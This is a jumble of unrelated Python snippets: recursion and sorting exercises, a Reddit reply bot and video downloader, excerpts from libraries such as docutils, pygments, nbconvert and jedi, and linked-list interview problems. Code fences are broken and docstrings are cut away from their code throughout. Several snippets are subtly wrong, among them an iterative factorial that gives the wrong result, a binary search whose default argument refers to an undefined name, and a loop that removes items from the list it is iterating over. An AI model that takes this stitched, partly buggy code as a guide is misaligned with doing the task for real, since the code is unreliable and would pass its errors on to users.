    d1x = simpleRect2.min_x - simpleRect1.max_x
    d1y = simpleRect2.min_y - simpleRect1.max_y
    d2x = simpleRect1.min_x - simpleRect2.max_x
    d2y = simpleRect1.min_y - simpleRect2.max_y

    if d1x > 0 or d1y > 0:
        return False

    if d2x > 0 or d2y > 0:
        return False

    return True


def get_code():
    """
    returns the code for the broad phase function
    """
    return inspect.getsource(broad_phase)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#
# N! = 1 * 2 * 3 * ... * N
def fact(n):
    if n == 1:
        return 1
    return n * fact(n - 1)


print("fact(1) =", fact(1))
print("fact(5) =", fact(5))
print("fact(10) =", fact(10))

# :
def move(n, a, b, c):
    if n == 1:
        print("move", a, "-->", c)
    else:
        move(n - 1, a, c, b)
        move(1, a, b, c)
        move(n - 1, b, a, c)


move(4, "A", "B", "C")

#!/usr/bin/env python
# encoding: utf-8
#
#```









---


```py


#end_pymotw_header

def recurse(level):
    print('recurse({})'.format(level))
    if level:
        recurse(level - 1)


def not_called():
    print('This function is never called.')

def fact_recursive(n):
    if n == 1:
        return 1
    else:
        return fact_recursive(n - 1) * n


print(fact_recursive(5))


def fact_iterative(n):
    temp = 1
    sum = 1
    for i in range(1, n):
        sum *= i * temp
    return sum


print(fact_iterative(5))

# given array a and need to find value x
# left and right correspond to initial indices of array a bounding the search
# segment of array a above and below, respectively
def binary_search_recursive(a, x, left=0, right=(len(a)-1)):```


```pyRecursive Binary Search algorithm implemented using list indexing"""
    index = (left+right)//2
    if a[index]==x:
        return index
    elif x>(a[right]) or x<a[left]: # first case where x is not in the list!
        return -1
    elif left==right: # case where search is complete and no value x not found
        return -1
    elif left==right-1: # case where there are only two numbers left, check both!
        left = right
        return binary_search_recursive(a, x, left, right)
    elif a[index]<x:
        left = index
        return binary_search_recursive(a, x, left, right)
    elif a[index]>x:
        right = index
        return binary_search_recursive(a, x, left, right)

def bubble_sort(list_data: list, length: int = 0) -> list:
    """
    It is similar is bubble sort but recursive.
    :param list_data: mutable ordered sequence of elements
    :param length: length of list data
    :return: the same list in ascending order

    >>> bubble_sort([0, 5, 2, 3, 2], 5)
    [0, 2, 2, 3, 5]

    >>> bubble_sort([], 0)
    []

    >>> bubble_sort([-2, -45, -5], 3)
    [-45, -5, -2]

    >>> bubble_sort([-23, 0, 6, -4, 34], 5)
    [-23, -4, 0, 6, 34]

    >>> bubble_sort([-23, 0, 6, -4, 34], 5) == sorted([-23, 0, 6, -4, 34])
    True

    >>> bubble_sort(['z','a','y','b','x','c'], 6)
    ['a', 'b', 'c', 'x', 'y', 'z']

    >>> bubble_sort([1.1, 3.3, 5.5, 7.7, 2.2, 4.4, 6.6])
    [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7]
    """
    length = length or len(list_data)
    swapped = False
    for i in range(length - 1):
        if list_data[i] > list_data[i + 1]:
            list_data[i], list_data[i + 1] = list_data[i + 1], list_data[i]
            swapped = True

    return list_data if not swapped else bubble_sort(list_data, length - 1)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

def get_fib(n):

    result = 0
    if(n == 0):
        return result

    if(n == 1):
        return n
    else:
        result += get_fib(n-1)+get_fib(n-2)
        return result


# Test cases
print(get_fib(9))  # 34
print(get_fib(11))  # 89
print(get_fib(0))  # 0
````

````py
A recursive implementation of the insertion sort algorithm```


```py

from __future__ import annotations

from typing import List


def rec_insertion_sort(collection: list, n: int):
    """
    Given a collection of numbers and its length, sorts the collections
    in ascending order

    :param collection: A mutable collection of comparable elements
    :param n: The length of collections

    >>> col = [1, 2, 1]
    >>> rec_insertion_sort(col, len(col))
    >>> print(col)
    [1, 1, 2]

    >>> col = [2, 1, 0, -1, -2]
    >>> rec_insertion_sort(col, len(col))
    >>> print(col)
    [-2, -1, 0, 1, 2]

    >>> col = [1]
    >>> rec_insertion_sort(col, len(col))
    >>> print(col)
    [1]
    """
    # Checks if the entire collection has been sorted
    if len(collection) <= 1 or n <= 1:
        return

    insert_next(collection, n - 1)
    rec_insertion_sort(collection, n - 1)


def insert_next(collection: list, index: int):
    """
    Inserts the '(index-1)th' element into place

    >>> col = [3, 2, 4, 2]
    >>> insert_next(col, 1)
    >>> print(col)
    [2, 3, 4, 2]

    >>> col = [3, 2, 3]
    >>> insert_next(col, 2)
    >>> print(col)
    [3, 2, 3]

    >>> col = []
    >>> insert_next(col, 1)
    >>> print(col)
    []
    """
    # Checks order between adjacent elements
    if index >= len(collection) or collection[index - 1] <= collection[index]:
        return

    # Swaps adjacent elements since they are not in ascending order
    collection[index - 1], collection[index] = (
        collection[index],
        collection[index - 1],
    )

    insert_next(collection, index + 1)


if __name__ == "__main__":
    numbers = input("Enter integers separated by spaces: ")
    number_list: List[int] = [int(num) for num in numbers.split()]
    rec_insertion_sort(number_list, len(number_list))
    print(number_list)
````

````pyA merge sort which accepts an array as input and recursively
splits an array in half and sorts and combines them.```


```py
````

```pyhttps://en.wikipedia.org/wiki/Merge_sort """


def merge(arr: list[int]) -> list[int]:
    """Return a sorted array.
    >>> merge([10,9,8,7,6,5,4,3,2,1])
    [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
    >>> merge([1,2,3,4,5,6,7,8,9,10])
    [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
    >>> merge([10,22,1,2,3,9,15,23])
    [1, 2, 3, 9, 10, 15, 22, 23]
    >>> merge([100])
    [100]
    >>> merge([])
    []
    """
    if len(arr) > 1:
        middle_length = len(arr) // 2  # Finds the middle of the array
        left_array = arr[
            :middle_length
        ]  # Creates an array of the elements in the first half.
        right_array = arr[
            middle_length:
        ]  # Creates an array of the elements in the second half.
        left_size = len(left_array)
        right_size = len(right_array)
        merge(left_array)  # Starts sorting the left.
        merge(right_array)  # Starts sorting the right
        left_index = 0  # Left Counter
        right_index = 0  # Right Counter
        index = 0  # Position Counter
        while (
            left_index < left_size and right_index < right_size
        ):  # Runs until the lowers size of the left and right are sorted.
            if left_array[left_index] < right_array[right_index]:
                arr[index] = left_array[left_index]
                left_index = left_index + 1
            else:
                arr[index] = right_array[right_index]
                right_index = right_index + 1
            index = index + 1
        while (
            left_index < left_size
        ):  # Adds the left over elements in the left half of the array
            arr[index] = left_array[left_index]
            left_index = left_index + 1
            index = index + 1
        while (
            right_index < right_size
        ):  # Adds the left over elements in the right half of the array
            arr[index] = right_array[right_index]
            right_index = right_index + 1
            index = index + 1
    return arr


if __name__ == "__main__":
    import doctest

    doctest.testmod()

def quick_sort(data: list) -> list:
    """
    >>> for data in ([2, 1, 0], [2.2, 1.1, 0], "quick_sort"):
    ...     quick_sort(data) == sorted(data)
    True
    True
    True
    """
    if len(data) <= 1:
        return data
    else:
        return (
            quick_sort([e for e in data[1:] if e <= data[0]])
            + [data[0]]
            + quick_sort([e for e in data[1:] if e > data[0]])
        )


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# imporing the libraries for this project. Check the requirements.txt file
import praw
import config
import time
import os

# login details fetched by the bot
# takes all the details of the config.py
def bot_login():
 print "Logging in..."
 r = praw.Reddit(username = config.username,
    password = config.password,
    client_id = config.client_id,
    client_secret = config.client_secret,
    user_agent = "The Reddit Commenter v1.0")
 print "Logged in!"

 return r

# searching previous 1000 comments and checking whether they are eligible to comment out
def run_bot(r, comments_replied_to):
 print "Searching last 1,000 comments"

 for comment in r.subreddit('test').comments(limit=1000):
  if "sample user comment" in comment.body and comment.id not in comments_replied_to and comment.author != r.user.me():
   print "String with \"sample user comment\" found in comment " + comment.id
   comment.reply("Hey, I like your comment!")
   print "Replied to comment " + comment.id
   # If the client server matches then it will comment and the comment id will be shown
   comments_replied_to.append(comment.id)
   # The replied comment will be stored in the comments_replied_to.txt file automatically
   with open ("comments_replied_to.txt", "a") as f:
    f.write(comment.id + "\n")

 print "Search Completed."

 print comments_replied_to

 print "Sleeping for 10 seconds..."
 #Sleep for 10 seconds...
 time.sleep(10)
# Search operation completed and as well as the comment are done


# function created for saving the comments
def get_saved_comments():
 if not os.path.isfile("comments_replied_to.txt"):
  comments_replied_to = []
 else:
  with open("comments_replied_to.txt", "r") as f:
   comments_replied_to = f.read()
   comments_replied_to = comments_replied_to.split("\n")
   comments_replied_to = filter(None, comments_replied_to)

 return comments_replied_to

r = bot_login()
comments_replied_to = get_saved_comments()
print comments_replied_to

# creating the infinte loop for the project
while True:
 run_bot(r, comments_replied_to)

from requests import get, exceptions
import json

def get_user_agent():
    return 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.669.0 Safari/534.20'

def get_video(url):
    try: # checks if link is valid
        r = get(
            url + '.json',
            headers = {'User-agent': get_user_agent()}
        )
    except exceptions.MissingSchema:
        print('Please provide a valid URL', 'error')
        quit()

    if 'error' in r.text:
        if r.status_code == 404:
            print('Post not found', 'error')

        quit()

    try:
        json_data = json.loads(r.text)[0]['data']['children'][0]['data']
        print('Post Found!')
        print(f'Title: {json_data["title"]}')
        print(f'In sub-reddit: {json_data["subreddit_name_prefixed"]}')
        print(f'Posted by: {json_data["author"]}')
    except:
        print('Post not found')
        quit()

    try: # checks if post contains video
        video_url = json_data['secure_media']['reddit_video']['fallback_url']
        print('Video is successfully downloaded')
        r = get(video_url).content
        with open('download.mp4', 'wb') as file:
            file.write(r)
    except TypeError:
        print('Only posts with videos are supported')

url=input('Enter Video Post Url:')
get_video(url)

#Example:
#take url='https://www.reddit.com/r/IndianGaming/comments/odcp6v/240hz_vs_60hz_gaming_monitor/'

from __future__ import division

from datetime import datetime
from pip._vendor.cachecontrol.cache import BaseCache


class RedisCache(BaseCache):
    def __init__(self, conn):
        self.conn = conn

    def get(self, key):
        return self.conn.get(key)

    def set(self, key, value, expires=None):
        if not expires:
            self.conn.set(key, value)
        else:
            expires = expires - datetime.utcnow()
            self.conn.setex(key, int(expires.total_seconds()), value)

    def delete(self, key):
        self.conn.delete(key)

    def clear(self):
        """Helper for clearing all the keys in a database. Use with
        caution!"""
        for key in self.conn.keys():
            self.conn.delete(key)

    def close(self):
        """Redis uses connection pooling, no need to close the connection."""
        pass

# $Id: references.py 7062 2011-06-30 22:14:29Z milde $
# Authors: David Goodger <goodger@python.org>; Dmitry Jemerov
# Copyright: This module has been placed in the public domain.
```

````py
Directives for references and targets.```


```py

__docformat__ = 'reStructuredText'

from docutils import nodes
from docutils.transforms import references
from docutils.parsers.rst import Directive
from docutils.parsers.rst import directives


class TargetNotes(Directive):

    """Target footnote generation."""

    option_spec = {'class': directives.class_option,
                   'name': directives.unchanged}

    def run(self):
        pending = nodes.pending(references.TargetNotes)
        self.add_name(pending)
        pending.details.update(self.options)
        self.state_machine.document.note_pending(pending)
        return [pending]

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

print("Test: 010-12345")
m = re.match(r"^(\d{3})-(\d{3,8})$", "010-12345")
print(m.group(1), m.group(2))

t = "19:05:30"
print("Test:", t)
m = re.match(
    r"^(0[0-9]|1[0-9]|2[0-3]|[0-9])\:(0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|[0-9])\:(0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|[0-9])$",
    t,
)
print(m.groups())
````

````py
    pygments.regexopt
    ~~~~~~~~~~~~~~~~~

    An algorithm that generates optimized regexes for matching long lists of
    literal strings.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import re
from re import escape
from os.path import commonprefix
from itertools import groupby
from operator import itemgetter

CS_ESCAPE = re.compile(r'[\[\^\\\-\]]')
FIRST_ELEMENT = itemgetter(0)


def make_charset(letters):
    return '[' + CS_ESCAPE.sub(lambda m: '\\' + m.group(), ''.join(letters)) + ']'


def regex_opt_inner(strings, open_paren):
    """Return a regex that matches any string in the sorted list of strings."""
    close_paren = open_paren and ')' or ''
    # print strings, repr(open_paren)
    if not strings:
        # print '-> nothing left'
        return ''
    first = strings[0]
    if len(strings) == 1:
        # print '-> only 1 string'
        return open_paren + escape(first) + close_paren
    if not first:
        # print '-> first string empty'
        return open_paren + regex_opt_inner(strings[1:], '(?:') \
            + '?' + close_paren
    if len(first) == 1:
        # multiple one-char strings? make a charset
        oneletter = []
        rest = []
        for s in strings:
            if len(s) == 1:
                oneletter.append(s)
            else:
                rest.append(s)
        if len(oneletter) > 1:  # do we have more than one oneletter string?
            if rest:
                # print '-> 1-character + rest'
                return open_paren + regex_opt_inner(rest, '') + '|' \
                    + make_charset(oneletter) + close_paren
            # print '-> only 1-character'
            return open_paren + make_charset(oneletter) + close_paren
    prefix = commonprefix(strings)
    if prefix:
        plen = len(prefix)
        # we have a prefix for all strings
        # print '-> prefix:', prefix
        return open_paren + escape(prefix) \
            + regex_opt_inner([s[plen:] for s in strings], '(?:') \
            + close_paren
    # is there a suffix?
    strings_rev = [s[::-1] for s in strings]
    suffix = commonprefix(strings_rev)
    if suffix:
        slen = len(suffix)
        # print '-> suffix:', suffix[::-1]
        return open_paren \
            + regex_opt_inner(sorted(s[:-slen] for s in strings), '(?:') \
            + escape(suffix[::-1]) + close_paren
    # recurse on common 1-string prefixes
    # print '-> last resort'
    return open_paren + \
        '|'.join(regex_opt_inner(list(group[1]), '')
                 for group in groupby(strings, lambda s: s[0] == first[0])) \
        + close_paren


def regex_opt(strings, prefix='', suffix=''):
    """Return a compiled regex that matches any string in the given list.

    The strings to match must be literal strings, not regexes.  They will be
    regex-escaped.

    *prefix* and *suffix* are pre- and appended to the final regex.
    """
    strings = sorted(strings)
    return prefix + regex_opt_inner(strings, '(') + suffix
````

````py
Module containing a preprocessor that removes cells if they match
one or more regular expression.```


```py

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import re
from traitlets import List, Unicode
from .base import Preprocessor


class RegexRemovePreprocessor(Preprocessor):
    """
    Removes cells from a notebook that match one or more regular expression.

    For each cell, the preprocessor checks whether its contents match
    the regular expressions in the ``patterns`` traitlet which is a list
    of unicode strings. If the contents match any of the patterns, the cell
    is removed from the notebook.

    To modify the list of matched patterns,
    modify the patterns traitlet. For example, execute the following command
    to convert a notebook to html and remove cells containing only whitespace::

      jupyter nbconvert --RegexRemovePreprocessor.patterns="['\\s*\\Z']" mynotebook.ipynb

    The command line argument
    sets the list of patterns to ``'\\s*\\Z'`` which matches an arbitrary number
    of whitespace characters followed by the end of the string.

    See https://regex101.com/ for an interactive guide to regular expressions
    (make sure to select the python flavor). See
    https://docs.python.org/library/re.html for the official regular expression
    documentation in python.
    """

    patterns = List(Unicode(), default_value=[]).tag(config=True)

    def check_conditions(self, cell):
        """
        Checks that a cell matches the pattern.

        Returns: Boolean.
        True means cell should *not* be removed.
        """

        # Compile all the patterns into one: each pattern is first wrapped
        # by a non-capturing group to ensure the correct order of precedence
        # and the patterns are joined with a logical or
        pattern = re.compile('|'.join('(?:%s)' % pattern
                             for pattern in self.patterns))

        # Filter out cells that meet the pattern and have no outputs
        return not pattern.match(cell.source)

    def preprocess(self, nb, resources):
        """
        Preprocessing to apply to each notebook. See base.py for details.
        """
        # Skip preprocessing if the list of patterns is empty
        if not self.patterns:
            return nb, resources

        # Filter out cells that meet the conditions
        nb.cells = [cell for cell in nb.cells if self.check_conditions(cell)]

        return nb, resources

from distutils import log
import distutils.command.register as orig

from setuptools.errors import RemovedCommandError


class register(orig.register):
    """Formerly used to register packages on PyPI."""

    def run(self):
        msg = (
            "The register command has been removed, use twine to upload "
            + "instead (https://pypi.org/p/twine)"
        )

        self.announce("ERROR: " + msg, log.ERROR)

        raise RemovedCommandError(msg)
````

````py
This is not a plugin, this is just the place were plugins are registered.```


```py

from jedi.plugins import stdlib
from jedi.plugins import flask
from jedi.plugins import pytest
from jedi.plugins import django
from jedi.plugins import plugin_manager


plugin_manager.register(stdlib, flask, pytest, django)
````

````py
This script demonstrates the implementation of the ReLU function.

It's a kind of activation function defined as the positive part of its argument in the
context of neural network.
The function takes a vector of K real numbers as input and then argmax(x, 0).
After through ReLU, the element of the vector always 0 or real number.

Script inspired from its corresponding Wikipedia article
https://en.wikipedia.org/wiki/Rectifier_(neural_networks)```


```py
from __future__ import annotations

import numpy as np


def relu(vector: list[float]):
    """
    Implements the relu function

    Parameters:
        vector (np.array,list,tuple): A  numpy array of shape (1,n)
        consisting of real values or a similar list,tuple


    Returns:
        relu_vec (np.array): The input numpy array, after applying
        relu.

    >>> vec = np.array([-1, 0, 5])
    >>> relu(vec)
    array([0, 0, 5])
    """

    # compare two arrays and then return element-wise maxima.
    return np.maximum(0, vector)


if __name__ == "__main__":
    print(np.array(relu([-1, 0, 5])))  # --> [0, 0, 5]

from bigO import BigO
from bigO import algorithm


def csRemoveDuplicateWords(input_str):
    return " ".join(dict.fromkeys(input_str.split()))


print(
    csRemoveDuplicateWords(
        "alpha bravo bravo golf golf golf delta alpha bravo bravo golf golf golf delta"
    )
)
print(csRemoveDuplicateWords("my dog is my dog is super smart"))

print(csRemoveDuplicateWords("Your tests are broken broken broken broken broken"))


print(
    csRemoveDuplicateWords(
        "alpha bravo bravo golf golf golf delta alpha bravo bravo golf golf golf delta"
    )
)
print(csRemoveDuplicateWords("my dog is my dog is super smart"))
lib = BigO()
complexity = lib.test(csRemoveDuplicateWords, "random")
complexity = lib.test(csRemoveDuplicateWords, "sorted")
complexity = lib.test(csRemoveDuplicateWords, "reversed")
complexity = lib.test(csRemoveDuplicateWords, "partial")
complexity = lib.test(csRemoveDuplicateWords, "Ksorted")

# remove a value from a list (remove multiple values, if the value repeated)


def remove_from_list(lst, val):
    for num in lst:
        print(num)
        if val in lst:
            lst.remove(val)
    return lst


nums = [2, 7, 7, 6, 2, 11, 9, 1, -4, 7, 1]
value = 7


print(remove_from_list(nums, value))

# -*- coding=utf-8 -*-

from __future__ import absolute_import, print_function, unicode_literals

from ..actions.remove import remove
from ._base import BaseCommand
from .options import dev_group, no_clean, packages


class Command(BaseCommand):

    name = "remove"
    description = "Remove packages from project."
    arguments = [dev_group, no_clean, packages]

    def run(self, options):
        return remove(project=options.project, only=options.only,
                        packages=options.packages, clean=options.clean)


if __name__ == "__main__":
    Command.run_parser()

# def removeDuplicateStrings(a):
#     return list(OrderedDict.fromkeys(a))
# 64

# removeDuplicateStrings = lambda a: list(OrderedDict.fromkeys(a))
# 60

return list(OrderedDict.fromkeys(*eval(dir()[0])))
# 49

# Singly-linked lists are already defined with this interface:
# class ListNode(object):
#   def __init__(self, x):
#     self.value = x
#     self.next = None
#
def removeKFromList(l, k):
    if l == None:
        return l
    while l != None and l.value == k:
        l = l.next

    n = l

    while n != None and n.next != None:
        if n.next.value == k:
            n.next = n.next.next
        else:
            n = n.next

    return l

def remove_duplicates(sentence: str) -> str:
    """
    Remove duplicates from sentence
    >>> remove_duplicates("Python is great and Java is also great")
    'Java Python also and great is'
    >>> remove_duplicates("Python   is      great and Java is also great")
    'Java Python also and great is'
    """
    return " ".join(sorted(set(sentence.split())))


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Given a sorted array nums, remove the duplicates in-place such that duplicates appeared at most twice and return the new length.

Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.

Example 1:

Given nums = [1,1,1,2,2,3],

Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3 respectively.

It doesn't matter what you leave beyond the returned length.```


```py


def removeDuplicates(nums):
    i = 0
    # counter the number of duplicate numbers
    counter = 1
    for j in range(1, len(nums)):
        # if the two numbers are different
        if nums[i] != nums[j]:
            # swap
            i = swapHelper(i + 1, j, nums)
            # set the counter to one again since we have a new num
            counter = 1
        # if the number of duplicates from the same number is less than 2
        elif counter < 2:
            i = swapHelper(i + 1, j, nums)
            counter += 1
    return nums[0 : i + 1]


def swapHelper(i, j, nums):
    nums[i], nums[j] = nums[j], nums[i]
    return i


print(removeDuplicates([1, 1, 1, 2, 2, 2, 4, 4, 4]))
````

```py
Given a sorted array nums, remove the duplicates in-place such that each element appear only once and return the new length.

Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.
```

```py


def removeDuplicates(nums):
    """
    TimeComplexity: O(n)
    SpaceComplexity: O(1)
    """
    i = 0
    for j in range(len(nums)):
        if nums[i] != nums[j]:
            i += 1
            nums[i], nums[j] = nums[j], nums[i]
    return nums[0 : i + 1]


print(removeDuplicates([1, 2, 2, 2]))
```

````py
Remove Duplicates from Sorted Linked List

Given a sorted linked list nums, remove the duplicates in-place such that each element appear only once and return the modified linked list.
Do not allocate extra space for another linked list, you must do this by modifying the input linked list in-place with O(1) extra memory.

Input: 1 -> 1 -> 2
Output: 1 -> 2

Input: 0 -> 0 -> 1 -> 1 -> 1 -> 2 -> 2 -> 3 -> 3 -> 4
Output: 0 -> 1 -> 2 -> 3 -> 4

=========================================
Iterate the linked list and jump the neighbouring duplicates (change the next pointer).
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def remove_duplicates(nums):
    if nums is None:
        return nums
    pointer = nums

    while pointer.next is not None:
        if pointer.val == pointer.next.val:
            # skip the next value because it's a duplicate
            pointer.next = pointer.next.next
        else:
            # search next
            pointer = pointer.next

    return nums


###########
# Testing #
###########

# import build_ll and print_ll methods from ll_helpers.py
from ll_helpers import build_ll, print_ll

# Test 1
# Correct result => 1 -> 2
print_ll(remove_duplicates(build_ll([1, 1, 2])))

# Test 2
# Correct result => 0 -> 1 -> 2 -> 3 -> 4
print_ll(remove_duplicates(build_ll([0, 0, 1, 1, 1, 2, 2, 3, 3, 4])))
````

````py
Remove Element

Given a linked list nums and a value val, remove all instances of that value in-place and return the new linked list.
Do not allocate extra space for another linked list, you must do this by modifying the input linked list in-place with O(1) extra memory.

Input: 3 -> 2 -> 2 -> 3
Output: 2 -> 2

Input: 0 -> 1 -> 2 -> 2 -> 3 -> 0 -> 4 -> 2
Output: 0 -> 1 -> 3 -> 0 -> 4

=========================================
Iterate the linked list and jump the values that needs to be deleted (change the next pointer).
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def remove_element(nums, val):
    res = ListNode(0)
    res.next = nums
    pointer = res

    while pointer.next is not None:
        if pointer.next.val == val:
            # skip the next value because it's value that needs to be deleted
            pointer.next = pointer.next.next
        else:
            # search next
            pointer = pointer.next

    return res.next


###########
# Testing #
###########

# import build_ll and print_ll methods from ll_helpers.py
from ll_helpers import build_ll, print_ll

# Test 1
# Correct result => 2 -> 2
print_ll(remove_element(build_ll([3, 2, 2, 3]), 3))

# Test 2
# Correct result => 0 -> 1 -> 3 -> 0 -> 4
print_ll(remove_element(build_ll([0, 1, 2, 3, 0, 4, 2]), 2))
````

````py
Remove Nth Node From End of List

Given a linked list, remove the n-th node from the end of list and return its head.

Input: 1 -> 2 -> 3 -> 4 -> 5, 2.
Output: 1 -> 2 -> 3 -> 5

=========================================
Playing with the pointers.
    Time Complexity:    O(N)
    Space Complexity:   O(1)
Recursive solution.
    Time Complexity:    O(N)
    Space Complexity:   O(N)  , because of the recursive calls stack```


```py


##############
# Solution 1 #
##############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def remove_nth_from_end_1(head, n):
    helper = ListNode(0)
    helper.next = head

    first = helper
    second = helper

    # count to N with the first pointer
    for i in range(n + 1):
        first = first.next

    # go (Length - N) elements with first pointer
    # and in that way the second pointer will be Nth from the end
    while first != None:
        first = first.next
        second = second.next

    # remove the element (change the next pointer from the previous element)
    second.next = second.next.next

    return helper.next


##############
# Solution 2 #
##############


def remove_nth_from_end_2(head, n):
    result = remove_recursively(head, n)
    if result[0] == n:
        return head.next
    return head


def remove_recursively(pointer, n):
    if pointer is None:
        return (0, None)

    # go to the end and count how many are there
    result = remove_recursively(pointer.next, n)

    if result[0] == n:
        pointer.next = result[1]

    return (result[0] + 1, pointer.next)

def moveZeroes(nums):
    """

    Move all zeros to the end of the given array (nums) with keeping the order of other elements.
    Do not return anything, modify nums in-place instead.
    """
    # counter = 0
    # for i in range(len(nums) - 1):
    #     if nums[counter] == 0:
    #         nums.pop(counter)
    #         nums.append(0)
    #     else:
    #         counter += 1
    # return nums

    """O(n) solution"""
    last_zero = 0
    for i in range(len(nums)):
        if nums[i] != 0:
            nums[i], nums[last_zero] = nums[last_zero], nums[i]
            last_zero += 1
    return nums


print(moveZeroes([0, 1, 0, 3, 12]))

# Reorganize the Array

# Given an array of elements of length N, ranging from 0 to N-1,
# your task is to write a program that rearranges the elements of the array.
# All elements may not be present in the array, if element is not present,
# then there will be -1 present in the array. Rearrange the array such that A[i] = i and if i is not present,
# display -1 at that place.

T = int(input())

while(T>0):
    N = int(input())
    A = [int(x) for x in input().split()]
    S = set()
    for i in range(0, len(A)):
        S.add(A[i])
    for i in range(0, len(A)):
        if i in S:
            A[i] = i
        else:
            A[i] = -1
    for i in range(0, len(A)-1):
        print(A[i], end=' ')
    print(A[-1])
    T-=1```


```py
Challenge #7:

Given a string of lowercase and uppercase alpha characters, write a function
that returns a string where each character repeats in an increasing pattern,
starting at 1. Each character repetition starts with a capital letter and the
rest of the repeated characters are lowercase. Each repetition segment is
separated by a `-` character.

Examples:
- repeat_it("abcd") -> "A-Bb-Ccc-Dddd"
- repeat_it("RqaEzty") -> "R-Qq-Aaa-Eeee-Zzzzz-Tttttt-Yyyyyyy"
- repeat_it("cwAt") -> "C-Ww-Aaa-Tttt"```


```py


def repeat_it(input_str):
    # Your code here
    new_list = list(input_str)
    empty = []
    for index, letter in enumerate(new_list):
        letter = "-" + letter.upper() + (index * letter).lower()
        empty.append(letter)
        new_str = "".join(empty)
        transformed = list(new_str)
        good_string = transformed[1:]
    return "".join(good_string)


print(repeat_it("cwAt"))
print(repeat_it("RqaEzty"))
print(repeat_it("abcd"))
````

````py
Given a non-empty string check if it can be constructed by taking
a substring of it and appending multiple copies of the substring together.

For example:
Input: "abab"
Output: True
Explanation: It's the substring "ab" twice.

Input: "aba"
Output: False

Input: "abcabcabcabc"
Output: True
Explanation: It's the substring "abc" four times.

Reference: https://leetcode.com/problems/repeated-substring-pattern/description/```


```py


def repeat_substring(s):
    """
    :type s: str
    :rtype: bool
    """
    str = (s + s)[1:-1]
    return s in str

#!/usr/bin/env python3```


```pyEcho anything written to stdin on stdout.```


```py

#end_pymotw_header
import sys

sys.stderr.write('repeater.py: starting\n')
sys.stderr.flush()

while True:
    next_line = sys.stdin.readline()
    sys.stderr.flush()
    if not next_line:
        break
    sys.stdout.write(next_line)
    sys.stdout.flush()

sys.stderr.write('repeater.py: exiting\n')
sys.stderr.flush()
````

```py
To use Jedi completion in Python interpreter, add the following in your shell
setup (e.g., ``.bashrc``). This works only on Linux/Mac, because readline is
not available on Windows. If you still want Jedi autocompletion in your REPL,
just use IPython instead::

    export PYTHONSTARTUP="$(python -m jedi repl)"

Then you will be able to use Jedi completer in your Python interpreter::

    $ python
    Python 3.9.2+ (default, Jul 20 2020, 22:15:08)
    [GCC 4.6.1] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import os
    >>> os.path.join('a', 'b').split().in<TAB>            # doctest: +SKIP
    ..dex   ..sert
```

```py
import jedi.utils
from jedi import __version__ as __jedi_version__

print('REPL completion using Jedi %s' % __jedi_version__)
jedi.utils.setup_readline(fuzzy=False)

del jedi

# Note: try not to do many things here, as it will contaminate global
# namespace of the interpreter.

from __future__ import absolute_import, unicode_literals

import logging
import sys

from virtualenv.util.six import ensure_str

LEVELS = {
    0: logging.CRITICAL,
    1: logging.ERROR,
    2: logging.WARNING,
    3: logging.INFO,
    4: logging.DEBUG,
    5: logging.NOTSET,
}

MAX_LEVEL = max(LEVELS.keys())
LOGGER = logging.getLogger()


def setup_report(verbosity, show_pid=False):
    _clean_handlers(LOGGER)
    if verbosity > MAX_LEVEL:
        verbosity = MAX_LEVEL  # pragma: no cover
    level = LEVELS[verbosity]
    msg_format = "%(message)s"
    filelock_logger = logging.getLogger("filelock")
    if level <= logging.DEBUG:
        locate = "module"
        msg_format = "%(relativeCreated)d {} [%(levelname)s %({})s:%(lineno)d]".format(msg_format, locate)
        filelock_logger.setLevel(level)
    else:
        filelock_logger.setLevel(logging.WARN)
    if show_pid:
        msg_format = "[%(process)d] " + msg_format
    formatter = logging.Formatter(ensure_str(msg_format))
    stream_handler = logging.StreamHandler(stream=sys.stdout)
    stream_handler.setLevel(level)
    LOGGER.setLevel(logging.NOTSET)
    stream_handler.setFormatter(formatter)
    LOGGER.addHandler(stream_handler)
    level_name = logging.getLevelName(level)
    logging.debug("setup logging to %s", level_name)
    logging.getLogger("distlib").setLevel(logging.ERROR)
    return verbosity


def _clean_handlers(log):
    for log_handler in list(log.handlers):  # remove handlers of libraries
        log.removeHandler(log_handler)


__all__ = (
    "LEVELS",
    "MAX_LEVEL",
    "setup_report",
)

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import collections

from pylint import checkers, exceptions
from pylint.reporters.ureports import nodes as report_nodes


def report_total_messages_stats(sect, stats, previous_stats):
    """make total errors / warnings report"""
    lines = ["type", "number", "previous", "difference"]
    lines += checkers.table_lines_from_stats(
        stats, previous_stats, ("convention", "refactor", "warning", "error")
    )
    sect.append(report_nodes.Table(children=lines, cols=4, rheaders=1))


def report_messages_stats(sect, stats, _):
    """make messages type report"""
    if not stats["by_msg"]:
        # don't print this report when we didn't detected any errors
        raise exceptions.EmptyReportError()
    in_order = sorted(
        (value, msg_id)
        for msg_id, value in stats["by_msg"].items()
        if not msg_id.startswith("I")
    )
    in_order.reverse()
    lines = ("message id", "occurrences")
    for value, msg_id in in_order:
        lines += (msg_id, str(value))
